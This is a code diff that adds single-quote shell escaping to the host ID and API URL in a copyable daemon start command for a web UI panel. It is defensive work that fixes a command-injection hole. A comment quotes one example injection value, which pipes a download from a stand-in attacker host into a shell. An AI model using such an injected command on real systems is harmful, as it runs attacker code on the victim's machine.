@@ -9,6 +9,16 @@ import { controlPlaneUrl } from "../lib/control-plane-url.ts";
 type CopyState = "idle" | "copied" | "failed";
 
 /**
+ * hostId is operator-chosen and unvalidated (any non-empty string, including shell
+ * metacharacters — see add-host-form.tsx), and this command is meant to be copy-pasted
+ * straight into a shell. Unquoted, a hostId like `x; curl evil.example | sh` would execute
+ * as shell syntax rather than being treated as a literal value.
+ */
+function shellQuote(value: string): string {
+  return `'${value.replaceAll("'", `'\\''`)}'`;
+}
+
+/**
  * Shown while a host has no live daemon connection: the exact, copyable command to start
  * one. HARNESS_API_URL comes from controlPlaneUrl(), never a raw API Gateway endpoint —
  * see that module for why.
@@ -39,8 +49,8 @@ export function ConnectHostPanel({ hostId }: { hostId: string }) {
     origin === null
       ? null
       : [
-          `HARNESS_HOST_ID=${hostId} \\`,
-          `HARNESS_API_URL=${origin} \\`,
+          `HARNESS_HOST_ID=${shellQuote(hostId)} \\`,
+          `HARNESS_API_URL=${shellQuote(origin)} \\`,
           `HARNESS_API_KEY=<bound service-account key> \\`,
           `pnpm local:daemon start`,
         ].join("\n");
